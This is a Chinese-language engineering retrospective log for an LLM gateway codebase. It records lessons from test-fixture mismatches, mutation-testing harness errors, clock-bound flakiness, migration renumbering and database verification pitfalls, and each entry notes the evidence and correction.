     ★ 判据 = **RUN 集合与 PASS/FAIL 集合的差集**（`-v` 输出里逐行对账）；
     ★ 「最慢的测试」会把注意力引到错误的方向（本轮最慢 0.28s，真凶是**没结束**的那个）。
  2. ⭐⭐⭐⭐⭐ **夹具失配在「容错型错误处理路径」上会被放大成挂起，而不是失败** ——
     ★ 产品的「探针失败 ⇒ 退避重试」是**正确**行为，但夹具失配会让它**永不成功**
     ⇒ ⇒ **凡「可能失败后重试」的入口，测试必须传有界 ctx**：
     ★ 实测：变异下 600s ⇒ **6.5s 红**。
  3. ⭐⭐⭐⭐ **「挂起」比「红」更危险**：它不告诉你发生了什么，只是把整包拖到框架超时
     ⇒ ⇒ 看到「某包耗时异常」时，**先判「是慢还是没结束」**。
  4. ⭐⭐⭐ **挂起会掩盖别的红**：本轮修完才暴露**另一个文件里 3 条从未被执行到的红**。
  5. ⭐⭐ **单跑 + 短 `-timeout` 是最快的抓栈手段**（`--timeout 45s` 让它自杀并打出 goroutine 栈）。
- 证据：handoff `§19.11.1`（pgxmock 报错原文 + 机制链表）；`docs/audit/2026-10-21-R65-606秒挂起归因.md` §1。
- 溯源：R65 轮（2026-10-21）。
## 2026-10-21 — ★★★★★ **夹具必须钉【行为】，不能钉【文本】**（llm-gateway-go R65）
- 场景：迁移 885 改了实现里的 SQL 常量，**没改夹具** ⇒ 夹具的正则期望失配。
- 根因（一行）：★ **「正则期望」等于把 SQL 文本钉进夹具；而 pgxmock 失配时
  **不消费**该期望 ⇒ 它卡在队列头 ⇒ 后续所有调用都 `was not expected`。**
  1. ⭐⭐⭐⭐⭐ **判据要钉「行为/形状」，不要钉「字面量」** ——
     ★ 本轮改成「标记前缀 `<<remaining-count>>` + 语义匹配器」
     （认「单列 bigint 计数查询」，不认它的写法）；
     ★ pgxmock v4 只有**池级**匹配器（`ExpectedQuery` 没有自己的 `QueryMatcher`）
     ⇒ 按期望分派只能从**期望字符串**出发。
  2. ⭐⭐⭐⭐ **匹配器自己也会退化成「永远匹配」⇒ 必须给它单独下门** ——
     ★ 「量具也要被量」：一条断言证明它**会拒绝**假输入。
  3. ⭐⭐⭐⭐ **实现一改就要回头核夹具**（实现改了、夹具没改，是**主干上的**不一致）⇒
     ★ 尤其当实现是**别人**的提交时（共享仓）：用 `git show --stat <rev> -- <dir>` 看它碰过哪些文件。
  4. ⭐⭐⭐ **静态契约门与夹具要分开修**：
     ★ 门红可能是「门过期」（改门）、也可能是「**实现破了**」（改实现）——
     ★ **本轮静态门抓到的是真缺陷**（42P01）⇒ 判据 = 先读「门在守什么」。
- 证据：handoff `§19.11.3`；审计文档 §4、§5。
## 2026-10-21 — ★★★★★ **「还原校验」必须校验【被改的那个路径】；编译红 ≠ 断言红**（llm-gateway-go R65）
- 场景：本轮的变异验证脚本**自己翻车两次**，产出了一批**作废的读数**。
- 根因（一行）：★ ① `restore()` 把备份拷到**仓库根目录**而不是原路径 ⇒ 源文件**从未被还原**
  ⇒ M2~M5 叠加在未还原的树上跑；且「还原校验」读的是**同一个错路径** ⇒ 报出「全部逐字一致」的**假读数**；
  ② 把**编译红**（`declared and not used`）读成了「门有牙」。
  1. ⭐⭐⭐⭐⭐ **还原校验必须读【被改的那个路径】的文件** ——
     ★ 读备份自己 ⇒ 永远是「一致」⇒ **假读数**；
     ★ 正确形态：每次变异**之前**核对原路径 md5 == 起始 md5，变异**之后**再核对一次。
  2. ⭐⭐⭐⭐ **变异结果必须区分「编译红」与「断言红」** ——
     ★ 编译红 ⇒ 该变异**作废**（不是「门有牙」），必须重做成**编译干净**的形态再验。
  3. ⭐⭐⭐⭐ **每次变异都要在「已还原的干净树」上做** ——
     ★ 否则第 N 个变异的读数里混着前面变异的残留。
  4. ⭐⭐⭐ **还原纪律**：备份副本 + md5 逐字校验，**禁用 `git checkout`**。
- 证据：handoff `§19.11.5`；审计文档 §5.1。
## 2026-10-21 — ★★★★ **断言 SQL 文本前必须【剥注释】**（llm-gateway-go R65）
- 场景：本轮自己新写的候选查询契约门断言 `"AND FALSE"`；变异 M6 **删掉该子句** ⇒
  测试**照样绿** ⇒ 门是恒绿的。
- 根因（一行）：★ **该关键词同时出现在子句上方的注释里** ⇒ 对**原始文本**做子串断言，
  注释里的字样就能满足它。
  1. ⭐⭐⭐⭐⭐ **凡对 SQL 文本做子串断言，先剥注释**（`--` 行注释 + `/* */` 块注释，含嵌套）
     ⇒ 本轮配套：剥完之后 M6 才变红。
  2. ⭐⭐⭐⭐ **剥注释器自己也要被量**（一条门证明它**会剥**、**不会剥过头**：
     ★ 字符串字面量里的 `--` 不是注释，不能被吃掉）。
  3. ⭐⭐⭐ **注释是给未来的人写的，但断言是对现在生效的** ——
     ★ 一个「说明性文本」足以让一条文本断言**恒绿**。
- 证据：handoff `§19.11.5` 第 3 条；审计文档 §5.2。
## 2026-10-21 — ★★★★★ **时钟下界的安全条件：自然值由「定时器/deadline」保证才安全；从同一个时钟派生就不安全**（llm-gateway-go R66）
- 场景：全仓 53 处时钟判据普查 ⇒ 找到**唯一一处「余量为零」的真缺陷**：
  `admin/distlock/lock_test.go` 的 follower-TTL 判据写下界 `elapsed < 200ms`，
  而 200ms **正是同一个测试等待的 TTL**。
- 根因（一行）：★ **看门狗定时器是用 Redis `PTTL` 剩余量武装的**（毫秒分辨率读数）
  ⇒ 自然值与 TTL 只差**亚毫秒** ⇒ **实测 10 次 ∈ [200.03ms, 201.64ms]
  ⇒ 最坏余量 0.03ms（0.015%）** ⇒ 任何扰动就是**假红**。
  1. ⭐⭐⭐⭐⭐ **分型要按「判别职责」，不是按阈值大小** ——
     ★ 「兜底型上界」（判不能太慢）与「判别型下界」（判不能太快）的负载敏感性完全不同；
     ★ 本轮 53 处里 42 处是前者、只有 11 处是后者 ⇒ **风险面比预估的窄得多**；
  2. ⭐⭐⭐⭐⭐ **判别型下界的安全条件** ——
     ★ **自然值由定时器 / ctx deadline 保证 ⇒ 安全**（定时器只晚不早 ⇒ 下界恒成立）；
     ★ **自然值是从同一个时钟派生的读数 ⇒ 不安全**（余量 = 读数分辨率 ⇒ 趋于 0）；
  3. ⭐⭐⭐⭐ **「零余量」在静态上可检** ——
     ★ **下界字面量 == 同一测试里被等待的时长字面量** ⇒ `go/ast` 可机械检出
     ⇒ ⇒ 落成一道门（`internal/clockguard`），把这一类变成**新增即红**；
  4. ⭐⭐⭐⭐ **判别职责要交给行为断言** ——
     ★ 本例「确实是等到 TTL 才放弃」已由 `errors.Is(err, ErrTTLExpired)` 证明
     ⇒ 时钟只需表达**粗判意图**（「不是瞬间」⇒ 取自然值的 1/4）+ 宽松上界。
- 证据：handoff `§19.12`；`docs/audit/2026-10-21-R66-全仓时钟判据普查.md` §2。
- 溯源：R66 轮（2026-10-21）。
## 2026-10-21 — ★★★★ **普查类任务：「按名/按形状的初判」必须回到实现去核**（llm-gateway-go R66）
- 场景：同一次普查里，`internal/streamretry/retry_test.go` 的 `elapsed < 5ms`
  （10ms 基准延迟）初判**可疑** —— 注释自承「with jitter, might be less」。
- 实测推翻：读 `internal/streamretry/retry.go:249-252` ⇒ 抖动是 **±20%**
  ⇒ 实际延迟 ∈ **[8ms, 12ms]** ⇒ 下界 5ms 有 **3ms 余量** ⇒ **安全**。
  1. ⭐⭐⭐⭐ **初判只用来决定「先看哪里」，不用来决定「有没有缺陷」** ——
     ★ 注释里的自述（"might be less"）也是**线索**，不是**证据**；
  2. ⭐⭐⭐⭐ **把怀疑的成因写成一个可查的数字**（抖动是 ±20% ⇒ 下限 8ms）
     ⇒ 数字一出来，结论自然出来（3ms 余量 ⇒ 安全）；
  3. ⭐⭐⭐ **阴性结论也要当缺陷一样复核** —— 「这条是安全的」同样需要**证据**，
     否则它只是一次没查下去的早退。
- 证据：handoff `§19.12.4`；审计文档 §4。
## 2026-10-21 — ★★★★★ **判据清单本身会过期**：**「C 类真缺陷密度」只有 1/15**，且一整批判据会随「族退役」同时失效（llm-gateway-go R67）
- 场景：R59 留下 **C2~C15 共 15 条「疑似真缺陷」**，每条都给了「下一步」；
  本轮按 §17.7-2 逐条查。
- 实测（当前树重建的一次性库，**不沿用 R59 的旧读数**）：
  **只有 C9 是真缺陷**（空表 ⇒ 分段 SQL 产出 NULL ⇒ handler 扫非指针 ⇒ 端点 500，**生产可复现**）；
  8 条是 **B 类**（测试钉了**已退役的 v1 族**或**少传一个实参**）；
  4 条是**判据前提过期**（门守的形状生产早就不用了）；2 条**已不复现**。
- ★★ **更狠的一条**：v1 族退役（890）**同时**让 C3/C5/C7/C8/C10 的
  **报错原文全部变了** ⇒ ⇒ **照着旧清单去改，会改错地方**。
  1. ⭐⭐⭐⭐⭐ **判据清单要先怀疑「清单本身过时」** ——
     ★ 15 条里 1 条真缺陷 ⇒ **「疑似真缺陷」这个分类本身就是待验证的**；
  2. ⭐⭐⭐⭐⭐ **实测读数必须取自当前树**，不能沿用上一轮的读数 ——
     ★ 判据的**前提**会随部署形态变化而失效 ⇒ **同一批判据，同一批报错原文，隔一天就不一样**；
  3. ⭐⭐⭐⭐ **每条判据的「下一步」落地前，先问「它守的东西现在归谁管」** ——
     ★ C10 的租户绑定从**触发器**换成了**RLS**（更强）⇒ 判据要**改瞄**，不是删除；
  4. ⭐⭐⭐⭐ **阴性结论（0 候选 / 0 列 / 0 命中）同样要当缺陷一样复核** ——
     ★ C5 的「0 候选」是**事实正确**（生产不再内联该形状）⇒ 改法是给抽取器加**自检**，
     而不是给「0」加一个计数断言；
  5. ⭐⭐⭐ **「红在哪」不等于「谁错了」** —— C4 的红是真的，但**生产同款形状实测是好的**
     （门测的形状生产不用）⇒ 判据的前提不成立。
- 证据：handoff `§19.13`；`docs/audit/2026-10-21-R67-C类逐条定性.md` §3。
- 溯源：R67 轮（2026-10-21）。
## 2026-10-21 — ★★★★★ **量具出问题时，「全红」和「全绿」同样不可信**（llm-gateway-go R67）
- 场景：为了量化「启动链跑第二遍会怎样」，先克隆一次性库再重放。
- 实测翻车：用 `CREATE DATABASE … TEMPLATE` 克隆 ⇒ **Citus 只给 NOTICE、库根本没建成**
  ⇒ 重放链的 **295 条「失败」全是连接失败**，不是迁移失败
  ⇒ 第一版读数「第二遍 295 条全红」**完全作废**。
- ⇒ ⇒ 改成**在一次性库本体上重放**（它可丢弃）⇒ 真读数 **applied=243 / failed=52**。
  1. ⭐⭐⭐⭐⭐ **读数前先断言「量具有效」**：连接成功吗？目标对象在吗？行数非 0 吗？
     ⇒ **「全红」的第一嫌疑是量具炸了**，不是被测对象坏了；
  2. ⭐⭐⭐⭐⭐ **在 Citus 上不能用 `CREATE DATABASE … TEMPLATE` 克隆库** ⇒
     克隆库必须换手段（重建 / dump-restore）⇒ **量具脚本的「前提」要写进脚本头注释**；
  3. ⭐⭐⭐⭐ **`string_agg` 在 0 行时返回 NULL，不是空串** ⇒
     「聚合成一列再扫进非空类型」的写法会**在空集上崩** ⇒ 逐行扫描才是安全形态
     （★ 本轮 C7 的旧门就是这么死的）；
  4. ⭐⭐⭐ **「报错为空」也是读数的一种形状** ⇒ 提取错误时别只 grep `^ERROR`
     （psql 的错误行带 `psql:<stdin>:N: ` 前缀 ⇒ 会全被漏掉 ⇒ 表现为「失败但没有原因」）。
- 证据：handoff `§19.13.6`；审计文档 §6。
## 2026-10-21 — ★★★★★ **变异验证的 harness 自己也会撒谎**：**「测试没跑」必须判作废，不能判绿**（llm-gateway-go R67）
- 场景：8 条变异，第一版读数 **3 红 5 绿**。
- 实测翻车（**harness 的三个缺陷**，不是被测对象的）：
  1. ⭐⭐⭐⭐⭐ **没加 build tag** ⇒ 带 `//go:build integration` 的测试**根本没跑**
     ⇒ `go test` 输出 `no tests to run` ⇒ **被当成了 PASS** ⇒ 3 条假绿；
  2. ⭐⭐⭐⭐ **没有「测试没跑 ⇒ 作废」检测** ⇒ 上一条的假绿没被抓住；
  3. ⭐⭐⭐⭐ **变异设计错误**：把一条**本来就成立**的断言去掉 ⇒ 绿是**正确**结果，
     不能读成「门没牙」；
  4. ⭐⭐⭐⭐⭐ **panic / init 崩溃** ⇒ `go test` 是 package-level **FAIL**，
     但**没有 `--- FAIL:` 行** ⇒ 靠 `"--- FAIL:" in out` 判红会**漏判**（第 4 条假绿）。
  1. ⭐⭐⭐⭐⭐ **harness 必须把「测试没跑」和「崩溃」都判成**非结论**：
     `no tests to run` / `panic:` / package-level `FAIL` 一律 ⇒ **作废并重做**；
  2. ⭐⭐⭐⭐⭐ **每条变异要写明**「期望红」还是「期望绿（阴性对照）」
     ⇒ 混在一起会把**阴性对照的绿**当成「门没牙」；
  3. ⭐⭐⭐⭐ **变异的「前提」要确定化**：本轮 M2（门不删空）只有在表**非空**时才有区分力
     ⇒ 先塞一行进去（`pre_sql`）⇒ 否则绿是**状态漂移**不是「门没牙」；
  4. ⭐⭐⭐ **还原校验读【被改的那个路径】**（R65 已立，本轮沿用，8/8 md5 逐字一致 ✅）。
- 证据：handoff `§19.13.6`；本轮变异脚本 `/tmp/r67/mutate2.py`。
## 2026-10-21 — ★★★★ **「不可重跑」的部署链是隐性依赖**：`InitSchema` 无台账 ⇒ 链必须可重跑（llm-gateway-go R67）
- 场景：量化「链跑第二遍」⇒ **52 条失败**（37 条是 v1 族退役造成的 42P01）。
- 实测根因：`installer/internal/dbinit/runner.go:1340` 的 `InitSchema`
  **无条件**应用每一条 startup 迁移，**没有「已应用」台账** ⇒ **链必须可重跑**。
  1. ⭐⭐⭐⭐⭐ **任何「按顺序应用一次」的脚本链，都是「可重跑」这条要求的隐性债务** ——
     ★ 没有台账 ⇒ 幂等性是**每个文件各自的义务** ⇒ 任何一个文件破坏幂等，
     **整条链就废了**（而且是**在第 N 条炸**，现场离真因很远）；
  2. ⭐⭐⭐⭐ **「退役一个族」会连带毁掉一堆旧迁移的重跑能力** ——
     ★ 本轮 37 条旧迁移在 v1 族退役后**必然 42P01** ⇒ 退役动作**必须**连带评估「链还能不能重跑」；
  3. ⭐⭐⭐⭐ **「重跑」不是理论路径**：R59 的 D 类（视图消失）、§143.22 的 680 号生产事故
     **都是重跑形态** ⇒ ⇒ 重跑路径在生产里**被走过**。
  4. ⭐⭐⭐ **修法（守卫 / 台账 / 显式拒绝）都改可部署链 ⇒ 属主拍板** ⇒ 审计轮只做实测 + 留证。
- 证据：handoff `§19.13.5`；审计文档 §5；量具 `scripts/audit/replay-startup-chain.sh`。
- 溯源：R67 轮（2026-10-21）。

## 2026-10-20 — ★★★★ **「读数手段本身」会带偏结论**：判据里的路径 / 字段名 / 范围都该先核（llm-gateway-go R68）
- 场景：本轮按 objective 的判据跑 `grep "failure log is stale\|watermark stalled past promote retention" /opt/llm-gateway-go/run/*.log | tail`，
  本机无 `/opt/llm-gateway-go/run/`（host-first 在 `~/kaixuan/llm-gateway-go-v2/logs/`）⇒ **判据里的路径是错的**，grep 出空结论。
  把路径换成真实位置后，`tail` 又把**最新的 2026-10-20 行全吃掉**（最后 50 行只到 10-19）⇒ **「binary 没换」是误判**：
  2026-10-20T03:41:22 的 WARN + `source_max_aggregation_id:0` 实测在场，provider 修法已生效。
- 实测根因：**判据（路径 + tail 范围 + 字段名）三条都错了**：
  1. **路径错了**：本机是 host-first 部署，`/opt/llm-gateway-go/` 是 154/245 的蓝绿布局；
  2. **`tail` 范围**：跨多天的 ERROR/WARN 同形态，tail 默认拿文件最后 50 行 = 把「修复后」的几条剪掉 = 把「修好」误读成「没修」；
  3. **字段名混用**：判据 `source_max_aggregation_id` 是 **provider 侧**字段，candidate 侧用 `last_insert_at / last_request_at / age / threshold` ⇒ 即便按判据「无 source_max_aggregation_id 字段 ⇒ 没修」也对 candidate 侧**恒假**。
- ⇒ ⇒ ★ **通用式**：
  1. ⭐⭐⭐⭐⭐ **判据里的「路径 / 字段 / 范围」三件套必须先核**——同一个组件的判据**不能照搬**给同链路上的另一个组件（provider / candidate 是两条；
     `request_logs_*` 与 `session_turns_*` 是两条；`_v1_hot` 与 `_with_current_month` 是两条）。**一句话：**判据跨组件复制 ⇒ 恒假阴性或恒假阳性。
  2. ⭐⭐⭐⭐⭐ **`tail` 是把「已修」误读成「没修」的直接原因**：跨日的同一形态 ERROR / WARN 同居一文件 ⇒ **时间窗必须显式选定**（grep 全窗口后再筛，或加 `--since=YYYY-MM-DD`），
     别让 `tail -50` 替我做「最近事件」的判断。
  3. ⭐⭐⭐⭐⭐ **跑测先于结论文**：本轮「binary 没换 / 需重部署」是先写结论再补证据，写出来后被打脸 ⇒ **grep 完先看「有 / 无 / 时间窗对不对」再下结论**。
  4. ⭐⭐⭐⭐ **失败测试要写明「红的归因」**：本轮 M3 第一版用 `_ = rid,` 替 `sourceMaxRequestIDKey, rid,` ⇒ 整包 build failed ⇒ 看起来红但**不是因为门有牙**，要明确说「编译错不算有效变异」。**重做**后用 `max(NULL)` 才给出可读且可编译的失败。
- 证据：handoff `§0/§1`；本轮 `docs/audit/2026-10-20-candidate-failure-monitor-S4停写假阳性二分类.md` §1 / §3；变异 M1~M5 还原 md5 `0e65f167e6f93a2418fb26e57d25de02`。
- 溯源：R68 轮（2026-10-20）。
## 2026-10-20 — ★★★ **`max(ts)` 形态相同 ⇒ 两种成因**：`source_max_*_id` 把「停写 / 真坏」拆开（llm-gateway-go R68）
- 场景：`candidate_failure_monitor` 在 S4 退役期持续 ERROR，root cause 是
  **「failure 冻结 + request 活跃」这一形态同时承载 S4 停写（预期内） 与 writer 真坏（真故障）**。
  旧实现用 `lastRequest=nil` 关门，但 S4 停写**只切 v1 族写**、**不切 session mirror** ⇒ lastRequest 恒有值 ⇒ 门永远打不开。
- 修法：加 `source_max_failure_id` / `source_max_request_id` 字段 +
  `candidateFailureMonitorClassifyStale(fid)` 纯函数按 `fid > 0` 二分类
  （LikelyStopWrite → WARN / WriterNeverWrote → ERROR）。
  1. ⭐⭐⭐⭐ **「单一形态 + 多种成因」必须**用历史最值（max(id)）把「曾经活跃」 vs 「从未写入」分开——光看时间戳不够；
  2. ⭐⭐⭐⭐ **告警的「关门条件」必须经受住「writer 停了，但其它表面还活」的现实**——
     本轮 `lastRequest=nil` 之所以失败，就是因为「会话族照写」是 S4 之后**强制要求**的（`ValidateSessionWriteState` 拒绝 `!v1 && !(enabled && shadow)`）；
  3. ⭐⭐⭐ **fireAlert 与 slog 等级要解耦**：本轮保留两条分支都 fire，但 slog 降级 ⇒ webhook 仍能审计台账，错误指标不刷。
- 证据：`aee31a117`；docs/audit/2026-10-20-candidate-failure-monitor-S4停写假阳性二分类.md §2 / §3。
- 溯源：R68 轮（2026-10-20）。

## 2026-10-20 — **harness 的「最终判定对」不等于「过程中的诊断对」**：分支结构漏判会让**错误的解释**被写进交接文档（Seen: 1/3 个不同工作日）
- 场景：S4 变异脚本的**对照分支**（C0「只改日志文案」）连着两轮报
  「第一轮变红（未解析）⇒ 重跑全绿 ⇒ 上一轮是**环境级瞬时**」⇒
  我把这个解释写进了 §12.5-7 与两轮交接文档。
- 实测打脸（2026-10-20 20:3x）：给脚本加了「每轮输出落盘」后，
  打开那份**一直存在却从没被看过的日志** ⇒ `exit=0` / `ok` ⇒
  **C0 第一轮本来就是绿的**。真因是脚本的对照分支**无条件**打印「第一轮变红」，
  **从不检查 `green`** ⇒ 绿被报成红 ⇒ 随后重跑（也是绿的）⇒ 又被报成「不稳定」。
  ⇒ ★ **两轮的「环境级瞬时」结论整个是错的** —— 门从来没有假阳性，对照一直是绿的。
- 根因（一行）：★ **分支结构漏判**（不是判定条件写错）——
  `else:` 之后的代码路径**假定**「到了这里就是红了」⇒ 绿也走同一条路。
  ⇒ 另注：另两份脚本（tuning / autoroute）的同一分支**都判了 `green`** ⇒
  **只有这一份有** ⇒ 抄脚本结构时抄漏了一行。
- 防复发检查：① **任何 harness 的每个分支，第一行都要问「进入这个分支的前提是什么」**，
  前提由哪个变量决定？它被检查了吗？⇒ ② **「红/绿」的判定只能在判过 `green` 之后**，
  不能由「进入了 else 分支」推定；③ ★★ **对照分支必须先判 `green`**：
  `if green: print("仍然全绿"); continue` —— 否则「绿」会被当成「红」再重跑一次，
  而重跑恰好也绿 ⇒ **最终 exit code 仍然正确** ⇒ **bug 对退出码不可见**；
  ④ ⇒ ★ **可见性陷阱**：这个 bug **不会造成假 PASS**（最终判定仍对），
  **只会污染过程中的解释** ⇒ 而解释会被抄进交接文档 ⇒ **变成假事实的复制传播**。
  ⇒ **凡是要写进文档的「诊断解释」，必须先确认它有对应的原始证据**
  （本轮的正解：脚本先把每轮输出落盘 ⇒ 下次直接看文件，不用猜）。
- 同族：[[变异验证的 harness 自己会撒谎]] · [[先读量具再读产物]] ·
[[0 命中的第一嫌疑是量具坏了]] · [[自己上一节的结论也要复核]] ·
[[阴性结论要当缺陷一样复核]]。
## 2026-10-20 — ★★★★ **机械改号会把「别人的号 / 历史上的号」一起改掉** ⇒ 文档门的 needle 当场脱钩（v1 族退役轮）
- 场景：本轮把「v1 族真删」迁移从 885 改号到 890（上游已占用 885~889 且**已部署**）。
  改号按「上下文里出现 885 就换 890」**逐行替换** ⇒ 把 runbook 里**「历史上那个迁移
  当时叫 885」**的记述也换了 ⇒ 而那些记述**正是文档门 needle 的来源**：
  §143.23 的 needle `embeddata/startup/885`、§143.24 的 needle `不需要迁移 885`、
  §143.25.8 的 needle `885 已被并行会话占用` ⇒ **三个门当场红**。
  1. ⭐⭐⭐⭐⭐ **「改号」改的是「本会话那条迁移的编号」，不是「数字 885 在句子里的含义」**：
     同一个 885 在树里可能指 ① 我这条迁移的旧号（要改）② 上游那条迁移的号（**不能改**）
     ③ **历史上某个号在当时的叫法**（**最危险**：它指的不是任何现存文件，而是「当时的取号现场」）。
  2. ⭐⭐⭐⭐⭐ **needle 类改动必须逐条回到「被断言的那份原文」核对**，不能靠替换脚本覆盖面推断：
     本轮 3 个红门全是「needle 与原文脱钩」，其中 **1 个正是我自己的脚本改的 needle**。
  3. ⭐⭐⭐⭐ **改号前先分清「谁拥有这个号」**：已部署的号不可改 ⇒ 只能改自己的 ⇒
     但**自己的号改成 890 之后，全仓的 885 就同时带着三种含义** ⇒ 必须逐个判别。
  4. ⭐⭐⭐ **门被自己改红时，先怀疑「needle」而不是「正文」**：本轮正文才是对的
     （runbook 原文保留），错的是 needle ⇒ 方向搞反就会去改历史叙述，把事实源改坏。
- 证据：本轮 `scripts/ursmcheck/section_14323/14324/14325` 三个门 **红 → 绿**（实测）；
  逐 hunk 归一校验脚本（**837 行改动里 833 行纯编号**、10 处人工判读并修正）。
- 溯源：v1 族退役轮（2026-10-20，编号订正提交）。
## 2026-10-20 — ★★★ **自写的校验器也会骗人：被删的 SQL 注释在 diff 里长成 `---`**（量具自检）
- 场景：写脚本逐 hunk 核对「改动是否只是编号替换」。第一版把 diff 里以 `---` 开头的行
  当成**文件头**跳过 ⇒ 而**被删掉的 SQL 注释行**（`-- 2026-10-20（迁移 885）…`）
  在 diff 里正好是 `--- …` ⇒ 被整批跳过 ⇒ 读数虚高（只看到 163 行，真实 851 行）。
  1. ⭐⭐⭐⭐⭐ **校验器的读数必须先自证**：换一种解析方式（按 `@@` 切块）重算，
     读数差一个量级就说明**解析器吞了内容**，不是「内容变干净了」。
  2. ⭐⭐⭐⭐ **diff 格式的坑要显式防**：文件头 `--- a/…` 与「被删的行内容以 `--` 开头」
     在文本层**同形** ⇒ 解析器**不能靠前缀猜** ⇒ 必须按 hunk 头切块。
  3. ⭐⭐⭐⭐ **归一后「相同」不等于「改对了」——数值 token 必须单独排掉**：
     第一版校验只做「885→⟦A⟧ / 890→⟦A⟧ 归一后逐字相同」，于是把
     **EXPLAIN 读数 `885.2ms`** 与 **reltuples `2,614,886`** 也当成编号换了
     ⇒ ★ **把实测证据改坏了**（读数会被人当真）⇒ 校验器必须再加一条：
     「`-` 行里含 885/886 的**更大数值 token**（`\d+(?:[.,_]\d+)*`）在 `+` 行里
     变了 ⇒ 判为数值损坏」。⚠ token 正则**不能**写成 `\d[\d,._]*`
     —— 那样会把「迁移 885,」「`885_xxx.sql`」也误判成数值损坏（尾随逗号/下划线被吃进 token）。
  4. ⭐⭐⭐ **分母要能自洽**：本轮最终报「837 行改动 / 833 行纯编号 / 10 处有意 hunk」，
     三个数必须能被第三方按同一脚本复算出来。
- 证据：`/tmp/check_renumber.py`（逐 hunk 归一比对：`-` 行 885/886 → ⟦A⟧/⟦B⟧，
  `+` 行 890/891 → ⟦A⟧/⟦B⟧，归一后必须逐字相同）；第一版读数 163 vs 修正版 837。
## 2026-10-20 — ★★★★★ **「存在」不等于「承重」**：挑证据时必须问「它承的是哪条查询」（三项目会话治理续做）
- 场景：给会话族 G-7（连接索引）补真库腿，判据要证明「888 的索引真的承重 admin 那个四列等值 join」。
- 实测翻车（**两次都是判据自己的错，不是产品坏**）：
  1. ⭐⭐⭐⭐⭐ 第一版按「含 `request_id`」挑索引 ⇒ 挑中 `idx_session_bodies_request`
     （**只有 request_id 一列**）⇒ 它能服务「按 request_id 查」，但**不**服务那条
     四列 join ⇒ **索引在、却不承重**；
  2. ⭐⭐⭐⭐⭐ 第一版用 `session_turns_with_current_month` 视图测 FTS ⇒
     **该视图根本不投影 `search_text`** ⇒ 42703 ⇒ 判据形状错了。
  1. ⭐⭐⭐⭐⭐ **库里有 ≠ 这条查询用得上** ⇒ 判据必须核对**列序覆盖谓词前缀**，
     不能只核对「列名出现过」；
  2. ⭐⭐⭐⭐⭐ **测某个读方就要用那个读方的真实来源**（admin 读的是
     `session_turns_hot ∪ session_turns` 两臂，不是 `..._with_current_month` 视图）
     ⇒ 拿「差不多的」表/视图代打 ⇒ 测的是**另一个形状**；
  3. ⭐⭐⭐⭐ **判据红了先查「我挑的是不是那个」**：库里**同时**存在
     「服务 A 查询的索引」与「服务 B 查询的索引」时，按名字挑必然挑错。
- 证据：`docs/audit/2026-10-20-三项目会话治理-审计与执行方案.md` §11.1；
  `domains/session/v2/session_family_p0_realdb_test.go`。
- 溯源：三项目会话治理续做轮（2026-10-20）。
## 2026-10-20 — ★★★★★ **计划断言的诚实边界**：`enable_seqscan=off` 只能证明「能用上」，证明不了「会选它」（三项目会话治理续做）
- 场景：给 G-5（全文检索）/ G-7（连接索引）写「查询走索引」的真库判据。
- 实测翻车（**如果照最直觉的写法，这条门是恒红的**）：测试表只有几百行 ⇒
  planner 本来就会选顺序扫描 ⇒ 断言「计划里必须有 Bitmap Index Scan」**必然红** ——
  而红的原因是**表小**，不是索引坏。
  1. ⭐⭐⭐⭐⭐ **「能用上」与「会选它」是两个主张** ⇒ 判据只能声称前者
     （`SET LOCAL enable_seqscan = off`），并在判据文件里**写明这条边界**；
  2. ⭐⭐⭐⭐⭐ 顺序扫描在小表上是**规模**决定的 ⇒ 拿它当失败信号 =
     **测的是规模不是索引**；
  3. ⭐⭐⭐⭐ **规模相关的偏好主张需要规模相关的 fixture**（灌够行数再测），
     否则就把「数据量」和「索引质量」混成一条读数；
  4. ⭐⭐⭐ **判据文件里显式写出「本门不证明什么」** ⇒ 下一个读它的人不会
     拿它去支撑它证明不了的结论。
- 证据：`domains/session/v2/session_family_p0_realdb_test.go` 的 `explainPlan` 注释。
## 2026-10-20 — ★★★★ **自指的门会把自己判红**：要猎的东西，门自己往往必须写出它的名字（三项目会话治理续做）
- 场景：给 asr 的 A-2「删掉孤儿脚本 `create_graph_memory_tables.sql`」补不变量门。
- 实测翻车：门**第一次跑就红**，红的是**它自己** ——
  因为门里有个常量 `orphanScriptName = "create_graph_memory_tables.sql"`，
  而门又在扫全仓找这个名字 ⇒ **自己举报自己**。
  1. ⭐⭐⭐⭐⭐ **门必须显式豁免自己**（本轮用 `runtime.Caller(0)` 取自身绝对路径并跳过）
     ⇒ 否则这道门**永远红**，而人只会去「改门」而不是「想清楚」；
  2. ⭐⭐⭐⭐ **这类门要有「豁免清单」而不是「豁免逻辑」** ⇒ 下一个人加第二个
     自指文件时，入口是**一处**而不是**散落各处**；
  3. ⭐⭐⭐⭐ **门第一次跑就红，先问「红的是不是门自己」** ——
     本仓判据纪律第 11 条（「判据红了先怀疑自己的前提」）的**自指变体**。
- 证据：`ai-session-manager/internal/db/graph_memory_orphan_script_test.go`。
## 2026-10-20 — ★★★★★ **「缺一条方向」是一类缺陷**：契约守住了一边，就必须在另一边给出路（三项目会话治理续做）
- 场景：memora 的 memory-bank 工具把 `.md` 当成 `memory` 表的**导出视图**
  （「DB 是权威源」），于是提供 `export`（DB → 磁盘）。
- 实测翻车：另一个会话手写了一个更新的 `.md` ⇒ 此时
  · `export` ⇒ 用旧内容**覆盖**新文件 ⇒ 丢掉别人的产出；
  · `ingest` ⇒ 同幂等键不同载荷 ⇒ **409** ⇒ 整批失败。
  ⇒ ⇒ **两条路都走不通** ⇒ 「磁盘上有更新的内容」这件事**没有出口**。
  ⇒ 而这不是契约错了：契约（「DB 权威」）是对的，**缺的是反向通道**。
  1. ⭐⭐⭐⭐⭐ **当一条契约只允许一个方向时，必须显式提供另一个方向** ——
     否则「另一边出现了更新的东西」就只能靠破坏契约来同步；
  2. ⭐⭐⭐⭐⭐ **补方向优先于改契约**：`ingest` 的 409 是**在保护**已生效的记忆，
     改它会动到服务端语义；补一条**运维通道**（`reconcile`，走 PG、不走 HTTP）
     既解了死结，又不动契约；
  3. ⭐⭐⭐⭐ **新方向必须默认「只报告」**（dry-run），写要显式 opt-in
     ⇒ 新工具的第一版不该有破坏性默认值；
  4. ⭐⭐⭐⭐ **补完方向后要立刻跑一遍往返**（本轮：`reconcile` ⇒ `verify` 由红转绿）
     ⇒ 「往返闭合」比「命令能跑」强得多。
- 证据：`memora/cmd/memory-bank/reconcile.go`；`memory-bank/README.md` 的「方向的分工」表。
